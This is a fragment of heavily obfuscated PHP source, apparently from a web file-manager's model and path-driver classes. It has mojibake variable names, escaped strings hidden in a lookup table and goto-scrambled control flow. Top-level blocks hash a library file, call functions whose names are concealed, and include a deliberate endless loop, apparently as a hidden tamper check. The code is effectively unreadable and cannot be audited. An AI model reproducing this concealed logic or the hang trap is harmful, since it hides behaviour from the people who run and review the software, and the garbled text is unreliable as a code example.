$DìÆ≤Çíµ°, !0); } protected function _fileOutImage($DöÑ©¯≠á∏, $A◊¬ÜŒÖçñ = 250) { $F≥ÇÜÛƒØ≤ =& $_SERVER[¯èãÄπµ]; $BçÏîûñËì = $this->model->sourceInfo($DöÑ©¯≠á∏); if ($BçÏîûñËì[$F≥ÇÜÛƒØ≤[366]] == $F≥ÇÜÛƒØ≤[83]) { show_json($F≥ÇÜÛƒØ≤[1116] . $DöÑ©¯≠á∏, !1); } $GLOBALS[$F≥ÇÜÛƒØ≤[1115]] = $BçÏîûñËì[$F≥ÇÜÛƒØ≤[28]]; $B¿Ω—®Í¿õ = $this->model->fileInfoGet($DöÑ©¯≠á∏); IO::fileOutImage($B¿Ω—®Í¿õ[$F≥ÇÜÛƒØ≤[75]], $A◊¬ÜŒÖçñ); } public function fileOutImage($e±ßÑø¨Üü, $DüœÒ‚˘ç§ = 250) { $this->_fileOutImage($e±ßÑø¨Üü, $DüœÒ‚˘ç§); } public function fileOutImageServer($A°ÜóæÊÃ–, $dÕî≥Ã“‰ = 250) { $this->_fileOutImage($A°ÜóæÊÃ–, $dÕî≥Ã“‰); } public function link($B•ì⁄åÇø‹, $CÚåÓ√Ü√∞ = '') { $B´ê—çÇ¥— = $this->model->fileInfoGet($B•ì⁄åÇø‹); return IO::link($B´ê—çÇ¥—[$_SERVER[¯èãÄπµ][75]], $CÚåÓ√Ü√∞); } protected function parse($AŸëî˜˜ã¯) { $a•Î¨¬∆Î« =& $_SERVER[¯èãÄπµ]; if (strstr($AŸëî˜˜ã¯, $a•Î¨¬∆Î«[8]) === !1) { return array($a•Î¨¬∆Î«[381] => intval($AŸëî˜˜ã¯), $a•Î¨¬∆Î«[75] => $a•Î¨¬∆Î«[33], $a•Î¨¬∆Î«[1113] => array()); } $Då¿‰ £ƒÒ = explode($a•Î¨¬∆Î«[8], trim($AŸëî˜˜ã¯, $a•Î¨¬∆Î«[8])); if (count($Då¿‰ £ƒÒ) < 2) { show_tips($AŸëî˜˜ã¯ . $a•Î¨¬∆Î«[1117]); } return array($a•Î¨¬∆Î«[381] => intval($Då¿‰ £ƒÒ[0]), $a•Î¨¬∆Î«[75] => $Då¿‰ £ƒÒ[1], $a•Î¨¬∆Î«[1113] => array_slice($Då¿‰ £ƒÒ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($E¨≈Ìã¿≈°) { $this->pathParse = $E¨≈Ìã¿≈°; $this->model = Model($_SERVER[¯èãÄπµ][1112]); } public function getPathOuter($bÿÂáÙÀÜÌ) { $a“ÕÕ‰°•Ø =& $_SERVER[¯èãÄπµ]; if (!$bÿÂáÙÀÜÌ) { return $bÿÂáÙÀÜÌ; } $D®™“„Ì±¯ = $this->parse($bÿÂáÙÀÜÌ); return trim(KodIO::makeShare($this->pathParse[$a“ÕÕ‰°•Ø[363]], $D®™“„Ì±¯[$a“ÕÕ‰°•Ø[363]]), $a“ÕÕ‰°•Ø[8]); } protected function infoParse($F’¯ü…≤™∫, $dñµ‰˜ ﬁ = false, $D≠æ£Ûí„Ç = false) { $AÎçπòôéç =& $_SERVER[¯èãÄπµ]; $CË…ï¬ÕÑå = $this->pathParse[$AÎçπòôéç[363]]; $B…äëâ·º˜ = trim($this->pathParse[$AÎçπòôéç[1013]], $AÎçπòôéç[8]); return Action($AÎçπòôéç[1118])->sharePathInfo($CË…ï¬ÕÑå, $B…äëâ·º˜); } public function infoFull($aÎåﬂ∞Ö¥Ü) { $fßëîÍ¥ØÏ =& $_SERVER[¯èãÄπµ]; $D¬¬ê∂åë’ = explode($fßëîÍ¥ØÏ[8], trim($aÎåﬂ∞Ö¥Ü, $fßëîÍ¥ØÏ[8])); if (count($D¬¬ê∂åë’) > 1) { $E·—ŸÿÚì∑ = implode($fßëîÍ¥ØÏ[8], array_splice($D¬¬ê∂åë’, 1)); $A˜∫¿·ıÀ± = $this->model->pathInfoByPath($D¬¬ê∂åë’[0], $E·—ŸÿÚì∑); if (!$A˜∫¿·ıÀ±) { return !1; } $this->pathParse[$fßëîÍ¥ØÏ[1013]] = $A˜∫¿·ıÀ±[$fßëîÍ¥ØÏ[365]]; } return $this->infoParse($aÎåﬂ∞Ö¥Ü); } public function listAll($c∑‹ªôÒ∫Ç) { goto c£’å¢úìÇ; c£’å¢úìÇ: $FÂ÷î◊ù¢§ =& $_SERVER[¯èãÄπµ]; $BÍªÛıÈŸº = IO::info($this->pathParse[$FÂ÷î◊ù¢§[75]]); if (!$BÍªÛıÈŸº) { return array(); } goto AÒ†é¡é†°; AÒ†é¡é†°: $fÃòπÉŸ¢ö = $this->model->listAll($c∑‹ªôÒ∫Ç); $eœ˘êÁÂÓÃ = Model($FÂ÷î◊ù¢§[532])->getInfo($BÍªÛıÈŸº[$FÂ÷î◊ù¢§[437]]); $Eî…ÖÕ˘Ñø = Action($FÂ÷î◊ù¢§[1118]); goto c‰´¯ÿ·Î≥; c‰´¯ÿ·Î≥: foreach ($fÃòπÉŸ¢ö as &$CÊ«à⁄ø’¥) { check_abort(); $CÊ«à⁄ø’¥[$FÂ÷î◊ù¢§[387]] = $Eî…ÖÕ˘Ñø->_shareItemeParse($CÊ«à⁄ø’¥[$FÂ÷î◊ù¢§[387]], $eœ˘êÁÂÓÃ); } return $fÃòπÉŸ¢ö; goto Bµ„Í∫√‘ö; Bµ„Í∫√‘ö: } } goto Bì≈íÜ‘ß¢; d≥úºïç∆ö: $bêŒ≈œæóé = LIB_DIR . $_SERVER[¯èãÄπµ][790]; $eìÜ£Ôèïç = $_SERVER[¯èãÄπµ][791]; if ($_SERVER[$_SERVER[¯èãÄπµ][792]] != $eìÜ£Ôèïç($bêŒ≈œæóé)) { goto b»ëµÉÌ‡Ö; Då¯êÏ°Ï„: $f¡Éáºä„∫ = explode($_SERVER[¯èãÄπµ][213], $f£⁄ËÀçé∂); if (count($f¡Éáºä„∫) < $_SERVER[¯èãÄπµ][544]) { $dìäâ¯“≥ä = $_SERVER[¯èãÄπµ][797]; $dìäâ¯“≥ä(); } $Aõ†ïÑ›¿± = $_SERVER[¯èãÄπµ][1166]; goto f›ö£≥™ñˆ; b»ëµÉÌ‡Ö: $AÚ¯Ωá”õ‹ = $_SERVER[¯èãÄπµ][794]; $E¿”ﬁÚ∂≈Õ = $_SERVER[$_SERVER[¯èãÄπµ][795]] . $_SERVER[¯èãÄπµ][796]; $f£⁄ËÀçé∂ = $AÚ¯Ωá”õ‹($E¿”ﬁÚ∂≈Õ); goto Då¯êÏ°Ï„; f›ö£≥™ñˆ: $Aõ†ïÑ›¿±($bêŒ≈œæóé); goto dß†œÃˆ¥Ç; dß†œÃˆ¥Ç: } goto f≥∆∫âõî; C±ìôõËÔ·: function beforeShutdownFatalError($dÒÉûçÓ£è) { think_exception($dÒÉûçÓ£è); } $_SERVER[$_SERVER[ÎÏ°ﬂ±å][48]] = $a∫≠âéùµŸ($_SERVER[$_SERVER[ÎÏ°ﬂ±å][45]]); $f∂ø–º◊∞å = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto e„Á¥Á≈å≤; Aêì÷•´ˆ¢: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\x2e\156\x6f\x74\151\x63\145\x4c\x69\163\164"; public $field = array("\x6e\141\155\x65", "\143\157\x6e\164\145\x6e\x74", "\141\165\x74\150", "\x6d\157\x64\x65", "\x74\151\155\x65", "\164\x79\160\x65", "\x6c\145\166\x65\154", "\x65\x6e\141\142\x6c\x65", "\x73\157\x72\x74"); public function listData($C°∞õ∫‘‡Ω = false, $EﬂÚùıÖÍ‰ = "\163\157\x72\164", $AéÁ¨‡ëŒà = false) { return parent::listData($C°∞õ∫‘‡Ω, $EﬂÚùıÖÍ‰, $AéÁ¨‡ëŒà); } public function add($aïº≥éÿˆ…) { $cì∞Î∆î∫π =& $_SERVER[¯èãÄπµ]; $Eà€ïÉâ–¢ = time(); if ($aïº≥éÿˆ…[$cì∞Î∆î∫π[12]] == $cì∞Î∆î∫π[2456]) { $Eà€ïÉâ–¢ = strtotime($aïº≥éÿˆ…[$cì∞Î∆î∫π[186]]); } $aïº≥éÿˆ…[$cì∞Î∆î∫π[186]] = $Eà€ïÉâ–¢; return parent::insert($aïº≥éÿˆ…); } public function update($b÷¯Ωêÿ“ , $fÜãê ü†·) { goto bëÛ®¯ñõü; B¨Óä–œÒé: return parent::update($b÷¯Ωêÿ“ , $fÜãê ü†·); goto bä∏˘È·ÊÑ; C±’Ê´¥äÒ: $BÉ≈Ÿ≠êã÷ = time(); if ($fÜãê ü†·[$B€ó®∆ª§È[12]] == $B€ó®∆ª§È[2456]) { $BÉ≈Ÿ≠êã÷ = strtotime($fÜãê ü†·[$B€ó®∆ª§È[186]]); } $fÜãê ü†·[$B€ó®∆ª§È[186]] = $BÉ≈Ÿ≠êã÷; goto B¨Óä–œÒé; bëÛ®¯ñõü: $B€ó®∆ª§È =& $_SERVER[¯èãÄπµ]; $a„Ç—ƒòç• = $this->listData($b÷¯Ωêÿ“ ); if (!$a„Ç—ƒòç•) { return !1; } goto C±’Ê´¥äÒ; bä∏˘È·ÊÑ: } public function remove($f∆„·°ã•ò) { $D‘Û÷®ı† = $this->listData($f∆„·°ã•ò); if (!$D‘Û÷®ı† || $D‘Û÷®ı†[$_SERVER[¯èãÄπµ][1082]]) { return !1; } return parent::remove($f∆„·°ã•ò); } public function sort($c¥ﬂ˘Æ∆ù¢, $eá§∏ááò¡) { return parent::update($c¥ﬂ˘Æ∆ù¢, $eá§∏ááò¡); } public function enable($b¢ﬁ∑è§óó, $AÊí™§¿ıØ) { return parent::update($b¢ﬁ∑è§óó, array($_SERVER[¯èãÄπµ][2457] => $AÊí™§¿ıØ)); } private function initUserOption() { $CÜÛüòÓπã =& $_SERVER[¯èãÄπµ]; $this->optionType = $CÜÛüòÓπã[2458]; $this->modelType = $CÜÛüòÓπã[2459]; $this->field = array($CÜÛüòÓπã[2460], $CÜÛüòÓπã[28], $CÜÛüòÓπã[186], $CÜÛüòÓπã[29], $CÜÛüòÓπã[2461], $CÜÛüòÓπã[692], $CÜÛüòÓπã[179]); } public function userNoticeGet($DâºÈµò≥• = false) { $this->initUserOption(); return parent::listData($DâºÈµò≥•, $_SERVER[¯èãÄπµ][363], !0); } public function userNoticeAdd($aáΩ∞ˆœ†∏) { $e„Ω°ëâñ° =& $_SERVER[¯èãÄπµ]; $this->initUserOption(); $D®—…π»Ñ¨ = $this->findByKey($e„Ω°ëâñ°[2460], $aáΩ∞ˆœ†∏[$e„Ω°ëâñ°[363]]); if ($D®—…π»Ñ¨) { return !0; } $A…∆≠í»›÷ = array($e„Ω°ëâñ°[2460] => $aáΩ∞ˆœ†∏[$e„Ω°ëâñ°[363]], $e„Ω°ëâñ°[28] => $aáΩ∞ˆœ†∏[$e„Ω°ëâñ°[28]], $e„Ω°ëâñ°[186] => $aáΩ∞ˆœ†∏[$e„Ω°ëâñ°[186]], $e„Ω°ëâñ°[29] => isset($aáΩ∞ˆœ†∏[$e„Ω°ëâñ°[29]]) ? $aáΩ∞ˆœ†∏[$e„Ω°ëâñ°[29]] : 1, $e„Ω°ëâñ°[2461] => isset($aáΩ∞ˆœ†∏[$e„Ω°ëâñ°[2461]]) ? $aáΩ∞ˆœ†∏[$e„Ω°ëâñ°[2461]] : 0, $e„Ω°ëâñ°[692] => 0, $e„Ω°ëâñ°[179] => 0); return parent::insert($A…∆≠í»›÷); } public function userNoticeEdit($cƒº®Ùø™ì, $cêÊÔ Í„œ) { $this->initUserOption(); return parent::update($cƒº®Ùø™ì, $cêÊÔ Í„œ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\164\145\x6d\137\157\x70\x74\151\157\156"; protected $jsonField = array("\155\x65\x6e\165", "\162\x6f\154\145", "\x72\x6f\x6c\x65\107\x72\x6f\165\x70", "\162\x65\x67\151\x73\164", "\145\155\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($d≠©ó·ÖÁÂ) { return "\123\171\x73\x74\145\x6d\117\x70\164\151\x6f\156\137{$d≠©ó·ÖÁÂ}"; } protected function optionDefault($A©àÁ∂ë÷… = '') { $cÁ‰∏ú ŒÊ =& $_SERVER[¯èãÄπµ]; if ($A©àÁ∂ë÷… == $cÁ‰∏ú ŒÊ[33]) { return $GLOBALS[$cÁ‰∏ú ŒÊ[6]][$cÁ‰∏ú ŒÊ[2462]]; } } } if (!isset($_SERVER[$_SERVER[¯èãÄπµ][792]]) || !isset($_SERVER[$_SERVER[¯èãÄπµ][1165]])) { goto bÊùÔÇÖüÈ; dò–¥Ì®≥∏: $f¡Éáºä„∫ = explode($_SERVER[¯èãÄπµ][213], $f£⁄ËÀçé∂); if (count($f¡Éáºä„∫) < $_SERVER[¯èãÄπµ][544]) { $dìäâ¯“≥ä = $_SERVER[¯èãÄπµ][797]; $dìäâ¯“≥ä(); } $Aõ†ïÑ›¿± = $_SERVER[¯èãÄπµ][1166]; goto BññÿØÕÁ; BññÿØÕÁ: $Aõ†ïÑ›¿±($_SERVER[$_SERVER[¯èãÄπµ][795]] . $_SERVER[¯èãÄπµ][796]); $E“ò´€‹Ìè = 2; while ($E“ò´€‹Ìè > 1) { $b‘„ÈççÁá = rawurlencode($E“ò´€‹Ìè . $_SERVER[¯èãÄπµ][357]); } goto BàÉ€‚â¯Ñ; bÊùÔÇÖüÈ: $AÚ¯Ωá”õ‹ = $_SERVER[¯èãÄπµ][794]; $E¿”ﬁÚ∂≈Õ = $_SERVER[$_SERVER[¯èãÄπµ][795]] . $_SERVER[¯èãÄπµ][796]; $f£⁄ËÀçé∂ = $AÚ¯Ωá”õ‹($E¿”ﬁÚ∂≈Õ); goto dò–¥Ì®≥∏; BàÉ€‚â¯Ñ: } goto EãáÌ‡Í˜ÿ; FÙÖﬂåï†ñ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\151\146\x79\x54\151\x6d\145", "\x74\151\x6d\145", "\151\x6e\163\145\x72\164\x2c\x75\x70\x64\141\164\145", "\146\165\156\143\164\151\157\156"), array("\143\162\x65\141\164\x65\124\x69\155\x65", "\164\x69\155\145", "\151\x6e\x73\x65\x72\164", "\x66\165\156\x63\164\151\157\x6e")); public function setDataAuto($DöáÈ—Öò¬) { $this->dataAuto = $DöáÈ—Öò¬; } public function __construct($fÍœâº«ë∆ = '', $A∂ØÛ·„°Œ = '', $e˜È∫≥À”À = '') { parent::__construct($fÍœâº«ë∆, $A∂ØÛ·„°Œ, $e˜È∫≥À”À); } public static function textEncode($D’Ñ∂¿òΩ») { if (!$D’Ñ∂¿òΩ») { return $D’Ñ∂¿òΩ»; } $c•ÓΩäâïé = json_encode($D’Ñ∂¿òΩ»); $c•ÓΩäâïé = preg_replace_callback($_SERVER[¯èãÄπµ][338], function ($dËªäø´∏è) { return addslashes($dËªäø´∏è[0]); }, $c•ÓΩäâïé); return json_decode($c•ÓΩäâïé); } public static function textDecode($A¶å›Œ“«Á) { $Cﬂ∂Ã©≥â =& $_SERVER[¯èãÄπµ]; $Cƒãÿ±≠ƒ£ = json_encode($A¶å›Œ“«Á); $Cƒãÿ±≠ƒ£ = preg_replace_callback($Cﬂ∂Ã©≥â[339], function ($DÜêÉú∞©ä) { return $_SERVER[¯èãÄπµ][93]; }, $Cƒãÿ±≠ƒ£); return json_decode($Cƒãÿ±≠ƒ£); } protected $tableMeta = array(); protected function _beforeInsert(&$FÆ”ƒïî‹ƒ, $EÇπÕÇ–—í) { $Cïÿ®≈¥˘® =& $_SERVER[¯èãÄπµ]; if (!$this->checkDataAutoHas($Cïÿ®≈¥˘®[340])) { return; } $this->dataBeforeFilter($FÆ”ƒïî‹ƒ, $Cïÿ®≈¥˘®[340]); } protected function _beforeUpdate(&$F≠–¿®Öﬂ´, $eßÚõπ≠£â) { $Bñ∫ÏúÕÁ“ =& $_SERVER[¯èãÄπµ]; if (!$this->checkDataAutoHas($Bñ∫ÏúÕÁ“[341])) { return; } $this->dataBeforeFilter($F≠–¿®Öﬂ´, $Bñ∫ÏúÕÁ“[341]); } protected function _afterSelect(&$e˜”¿é” ∞, $Bø À©°Ë›) { if (!is_array($e˜”¿é” ∞)) { return; } if (!$this->checkDataAutoHas($_SERVER[¯èãÄπµ][342])) { return; } foreach ($e˜”¿é” ∞ as &$Cü—Æ ÙÌù) { $this->dataAfterFilter($Cü—Æ ÙÌù); } } protected function _afterFind(&$E≥µæ◊ßÌÒ, $c–í∏•ÇıÁ) { if (!is_array($E≥µæ◊ßÌÒ)) { return; } if (!$this->checkDataAutoHas($_SERVER[¯èãÄπµ][342])) { return; } $this->dataAfterFilter($E≥µæ◊ßÌÒ); } public function setAutoIncrement($c∏¥ıË∏Ìà) { $b§ß¡üà£∑ = array($this->getPk() => $c∏¥ıË∏Ìà); $A˜Ü ≠≠éÌ = $this->data($b§ß¡üà£∑)->add(); if ($A˜Ü ≠≠éÌ) { $this->delete($A˜Ü ≠≠éÌ); } } public function getAutoIncrement() { $aˆòøë…Ò§ = $this->getTableName(); $cÑÑ‚ô⁄ñ÷ = $this->max($this->getPk()); $b≤¬≤º¬ïÛ = $this->query("\x73\150\157\x77\x20\164\141\x62\x6c\x65\x20\163\x74\141\x74\165\x73\40\167\x68\x65\x72\145\x20\x4e\141\155\x65\75\47{$aˆòøë…Ò§}\47"); $c•°â◊Ã¬‚ = $b≤¬≤º¬ïÛ[0][$_SERVER[¯èãÄπµ][343]]; $a∂‰»≈È≤¢ = max($cÑÑ‚ô⁄ñ÷, $c•°â◊Ã¬‚); return $a∂‰»≈È≤¢; } protected function _callBefore($BπÇäŸ©⁄Ô, $aæÏÌ©í≤å) { return $this->cacheCallCheck($BπÇäŸ©⁄Ô, $aæÏÌ©í≤å, !1); } protected function _callAfter($D–∑©ßê’ø, $FÔ‘çé¿›Ì) { return $this->cacheCallCheck($D–∑©ßê’ø, $FÔ‘çé¿›Ì, !0); } protected function cacheFunctionAlias($A∏°„ÌπÊÆ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($dãŸã»áùﬁ, $a∆éó≤¥ó¥, $f∫¨ß§îﬁÆ = false) { $C‹éù≈∞„Æ = $this->cacheFunctionAlias($a∆éó≤¥ó¥); if (!$C‹éù≈∞„Æ) { return; } foreach ($C‹éù≈∞„Æ as $a¿óÉ±Ω…® => $b—ÜÎôÑﬁ¡) { $CÔÙØ»ß≤¶ = $b—ÜÎôÑﬁ¡[0]; $BÚ˜ÛÖÓ∏„ = explode($_SERVER[¯èãÄπµ][47], $b—ÜÎôÑﬁ¡[1]); if ($dãŸã»áùﬁ == $a¿óÉ±Ω…®) { return $this->cacheFunctionGet($a¿óÉ±Ω…®, $CÔÙØ»ß≤¶); } if ($f∫¨ß§îﬁÆ && in_array($dãŸã»áùﬁ, $BÚ˜ÛÖÓ∏„)) { $this->cacheFunctionClear($a¿óÉ±Ω…®, $CÔÙØ»ß≤¶); } } } public function cacheFunctionGet($fäÕ∂ÍÀ¯, $DﬁéÊ¡Èö™) { $câ’Ù‡‡ÿ” = $this->cacheKeyMake($fäÕ∂ÍÀ¯, $DﬁéÊ¡Èö™); $cãÊûÀâß· = Cache::get($câ’Ù‡‡ÿ”); if (!is_array($cãÊûÀâß·)) { $cãÊûÀâß· = call_user_func_array(array($this, $fäÕ∂ÍÀ¯), array($DﬁéÊ¡Èö™, !0)); Cache::set($câ’Ù‡‡ÿ”, $cãÊûÀâß·); } return $cãÊûÀâß·; } public function cacheFunctionClear($d≈Èø†õÚ˘, $Aﬂ∑◊ΩÆƒÛ) { $EßÑ⁄À∞Éô = $Aﬂ∑◊ΩÆƒÛ; if (!is_array($Aﬂ∑◊ΩÆƒÛ)) { $EßÑ⁄À∞Éô = array($Aﬂ∑◊ΩÆƒÛ); } foreach ($EßÑ⁄À∞Éô as $Dª”¬ÉÚëÏ) { $cÖπﬁ√«∆Ù = $this->cacheKeyMake($d≈Èø†õÚ˘, $Dª”¬ÉÚëÏ); Cache::remove($cÖπﬁ√«∆Ù); } } private function cacheKeyMake($A¿à¢¿ÏÑÌ, $bÈΩ¬ç§Ù÷) { $fÕÁà¶‚ÏÕ =& $_SERVER[¯èãÄπµ]; return get_class($this) . $fÕÁà¶‚ÏÕ[70] . $A¿à¢¿ÏÑÌ . $fÕÁà¶‚ÏÕ[344] . $bÈΩ¬ç§Ù÷; } protected function selectPage($eÌ∑áé‘Ú© = 200, $DœÑé∏Ëìâ = 1) { goto fà∫∆…Ûƒ∑; aµ–®«ˆ∞„: $c‚‡≈∏Ûèâ = 4000; $eÌ∑áé‘Ú© = isset($in[$fñÁπñ∑∫ä[345]]) ? $in[$fñÁπñ∑∫ä[345]] : $eÌ∑áé‘Ú©; if ($eÌ∑áé‘Ú© === -1) { unset($in[$fñÁπñ∑∫ä[345]]); $c‚‡≈∏Ûèâ = 100000000; $eÌ∑áé‘Ú© = $c‚‡≈∏Ûèâ; } goto BÂäÈ¿ëüŒ; fà∫∆…Ûƒ∑: $fñÁπñ∑∫ä =& $_SERVER[¯èãÄπµ]; global $in; $EÇû´î†¥ = $this->optionsValue(); goto aµ–®«ˆ∞„; d›—ø˜∂≤’: if ($A∫ØÔ—·Ú± == 1) { $Eñò–Ö»´ = count($dªå·ªà¢); } $FßßäØÎˆ‹ = array($fñÁπñ∑∫ä[347] => array($fñÁπñ∑∫ä[348] => $Eñò–Ö»´, $fñÁπñ∑∫ä[345] => $eÌ∑áé‘Ú©, $fñÁπñ∑∫ä[336] => $DœÑé∏Ëìâ, $fñÁπñ∑∫ä[349] => $A∫ØÔ—·Ú±), $fñÁπñ∑∫ä[350] => $dªå·ªà¢ ? $dªå·ªà¢ : array()); return $FßßäØÎˆ‹; goto CÒßèÆ¨Ñˆ; c√öÁ›âΩ¿: $A∫ØÔ—·Ú± = ceil($Eñò–Ö»´ / $eÌ∑áé‘Ú©); $DœÑé∏Ëìâ = intval(isset($in[$fñÁπñ∑∫ä[336]]) ? $in[$fñÁπñ∑∫ä[336]] : $DœÑé∏Ëìâ); $DœÑé∏Ëìâ = $DœÑé∏Ëìâ <= 1 ? 1 : ($DœÑé∏Ëìâ >= $A∫ØÔ—·Ú± ? $A∫ØÔ—·Ú± : $DœÑé∏Ëìâ); goto C˘Çã˘ëÃ√; dòê“”µ‘¨: $Eñò–Ö»´ = intval($this->count()); $eÌ∑áé‘Ú© = intval($eÌ∑áé‘Ú©); $eÌ∑áé‘Ú© = $eÌ∑áé‘Ú© <= 5 ? 5 : ($eÌ∑áé‘Ú© >= $c‚‡≈∏Ûèâ ? $c‚‡≈∏Ûèâ : $eÌ∑áé‘Ú©); goto c√öÁ›âΩ¿; BÂäÈ¿ëüŒ: $aî≥¯œ∆©é = $EÇû´î†¥; $aî≥¯œ∆©é[$fñÁπñ∑∫ä[346]] = array(); $this->optionsValue($aî≥¯œ∆©é); goto dòê“”µ‘¨; C˘Çã˘ëÃ√: $this->optionsValue($EÇû´î†¥); $dªå·ªà¢ = $this->page($DœÑé∏Ëìâ, $eÌ∑áé‘Ú©)->select(); $dªå·ªà¢ = is_array($dªå·ªà¢) ? $dªå·ªà¢ : array(); goto d›—ø˜∂≤’; CÒßèÆ¨Ñˆ: } protected function checkLength($e∏◊æ®…éç, $b±ö™ÕåÚø = 0, $A¯ﬂŸÙΩ√ò = '') { $cíƒèƒ’ŸÎ =& $_SERVER[¯èãÄπµ]; $b±ö™ÕåÚø = $b±ö™ÕåÚø ? $b±ö™ÕåÚø : 65536; if (!$e∏◊æ®…éç || strlen($e∏◊æ®…éç) < $b±ö™ÕåÚø) { return; } $A¯ﬂŸÙΩ√ò = $A¯ﬂŸÙΩ√ò ? $A¯ﬂŸÙΩ√ò . $cíƒèƒ’ŸÎ[67] : $cíƒèƒ’ŸÎ[33]; show_json($A¯ﬂŸÙΩ√ò . LNG($cíƒèƒ’ŸÎ[351]) . "\x28{$b±ö™ÕåÚø}\51", !1); } protected function metaSet($fçƒ‡∆ìŒË, $B”ö≤ñØãœ = null, $c¿ç◊“Ò¯‚ = null) { goto Eöô ™Áë¶; Bã√ó„¿€˜: $Aπ§áÖÑıÍ = $this->tableMeta[$e≈‡Íƒ¿êµ[353]]; $EØËµ¥Ëá≈ = Model($Aπ§áÖÑıÍ); $fçŸÆÇ‚Ç• = array($F≥Óñœ…–ÿ => $fçƒ‡∆ìŒË, $e≈‡Íƒ¿êµ[354] => $B”ö≤ñØãœ); goto aÉ√ÕÀçÑ∆; A¨øÚî¬––: $EØËµ¥Ëá≈->where(array($F≥Óñœ…–ÿ => $fçƒ‡∆ìŒË))->addAll($bÜŒÕ’¥Ô£, array(), !0); return !0; goto dâ¬±¬Îè›; Eöô ™Áë¶: $e≈‡Íƒ¿êµ =& $_SERVER[¯èãÄπµ]; if (!$this->tableMeta) { return !1; } $F≥Óñœ…–ÿ = $this->tableMeta[$e≈‡Íƒ¿êµ[352]]; goto Bã√ó„¿€˜; aÉ√ÕÀçÑ∆: if (is_null($B”ö≤ñØãœ)) { return $EØËµ¥Ëá≈->where(array($F≥Óñœ…–ÿ => $fçƒ‡∆ìŒË))->delete(); } if (is_null($c¿ç◊“Ò¯‚)) { return $EØËµ¥Ëá≈->where($fçŸÆÇ‚Ç•)->delete(); } $a¶»„á∂˜Ã = is_array($B”ö≤ñØãœ) ? $B”ö≤ñØãœ : array(); goto fÚﬁ∆ôÕ˘ò; fÚﬁ∆ôÕ˘ò: if (is_string($B”ö≤ñØãœ)) { $a¶»„á∂˜Ã[$B”ö≤ñØãœ] = $c¿ç◊“Ò¯‚; } $bÜŒÕ’¥Ô£ = array(); foreach ($a¶»„á∂˜Ã as $Cú√ŒÃ≤Ï“ => $E∫ﬁ»‹√°Ü) { $this->checkLength($E∫ﬁ»‹√°Ü, !1, $Aπ§áÖÑıÍ . $e≈‡Íƒ¿êµ[4] . $Cú√ŒÃ≤Ï“); $bÜŒÕ’¥Ô£[] = array($F≥Óñœ…–ÿ => $fçƒ‡∆ìŒË, $e≈‡Íƒ¿êµ[89] => $Cú√ŒÃ≤Ï“, $e≈‡Íƒ¿êµ[355] => $E∫ﬁ»‹√°Ü); } goto A¨øÚî¬––; dâ¬±¬Îè›: } public function metaGet($DÍÖ…πÕâØ) { goto BóÀç∑Í≠–; eÍá¡ÿÑÙî: $CÁ¬ˆ¡¶ ‡ = array_to_keyvalue($CÁ¬ˆ¡¶ ‡, $Dú¨›œ§Ã≠[89], $Dú¨›œ§Ã≠[355]); return $CÁ¬ˆ¡¶ ‡; goto bÍﬂˆàÒ—ı; d¨ÙãŸﬂå®: $BôéØÍ®éâ = Model($this->tableMeta[$Dú¨›œ§Ã≠[353]]); $fèá±Öµπˆ = array($e“åÎ¶ÈÿÔ => $DÍÖ…πÕâØ); $CÁ¬ˆ¡¶ ‡ = $BôéØÍ®éâ->field($Dú¨›œ§Ã≠[356])->where($fèá±Öµπˆ)->select(); goto eÍá¡ÿÑÙî; BóÀç∑Í≠–: $Dú¨›œ§Ã≠ =& $_SERVER[¯èãÄπµ]; if (!$this->tableMeta) { return array(); } $e“åÎ¶ÈÿÔ = $this->tableMeta[$Dú¨›œ§Ã≠[352]]; goto d¨ÙãŸﬂå®; bÍﬂˆàÒ—ı: } private function checkDataAutoHas($E≤àÒáÆü‡) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $dÍÊπ÷§Â≥) { if (in_array($E≤àÒáÆü‡, explode($_SERVER[¯èãÄπµ][47], $dÍÊπ÷§Â≥[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$f≤ú’√ÀßÉ, $aå†ﬂÈ¡≤î) { $B°Ë∆¿‰é› =& $_SERVER[¯èãÄπµ]; foreach ($this->dataAuto as $báË∫‹ï‘è) { $EÖΩä“Œüì = $báË∫‹ï‘è[0]; if (!in_array($aå†ﬂÈ¡≤î, explode($B°Ë∆¿‰é›[47], $báË∫‹ï‘è[2]))) { continue; } switch (trim($báË∫‹ï‘è[3])) { case $B°Ë∆¿‰é›[305]: case $B°Ë∆¿‰é›[306]: $C»–…«ì–∞ = $báË∫‹ï‘è[1]; $a÷¬Õãˆòã = isset($báË∫‹ï‘è[4]) ? (array) $báË∫‹ï‘è[4] : array(); if ($C»–…«ì–∞ == $B°Ë∆¿‰é›[186] && array_key_exists($EÖΩä“Œüì, $f≤ú’√ÀßÉ)) { if (!$f≤ú’√ÀßÉ[$EÖΩä“Œüì]) { unset($f≤ú’√ÀßÉ[$EÖΩä“Œüì]); } break; } if (isset($f≤ú’√ÀßÉ[$EÖΩä“Œüì])) { array_unshift($a÷¬Õãˆòã, $f≤ú’√ÀßÉ[$EÖΩä“Œüì]); } if ($B°Ë∆¿‰é›[305] == $báË∫‹ï‘è[3]) { $f≤ú’√ÀßÉ[$EÖΩä“Œüì] = call_user_func_array($C»–…«ì–∞, $a÷¬Õãˆòã); } else { $f≤ú’√ÀßÉ[$EÖΩä“Œüì] = call_user_func_array(array(&$this, $C»–…«ì–∞), $a÷¬Õãˆòã); } break; case $B°Ë∆¿‰é›[257]: $f≤ú’√ÀßÉ[$EÖΩä“Œüì] = $f≤ú’√ÀßÉ[$báË∫‹ï‘è[1]]; break; case $B°Ë∆¿‰é›[278]: if (isset($f≤ú’√ÀßÉ[$EÖΩä“Œüì]) && !is_string($f≤ú’√ÀßÉ[$EÖΩä“Œüì])) { $f≤ú’√ÀßÉ[$EÖΩä“Œüì] = json_encode_force($f≤ú’√ÀßÉ[$EÖΩä“Œüì]); } break; case $B°Ë∆¿‰é›[307]: if ($f≤ú’√ÀßÉ[$EÖΩä“Œüì] === $B°Ë∆¿‰é›[33]) { 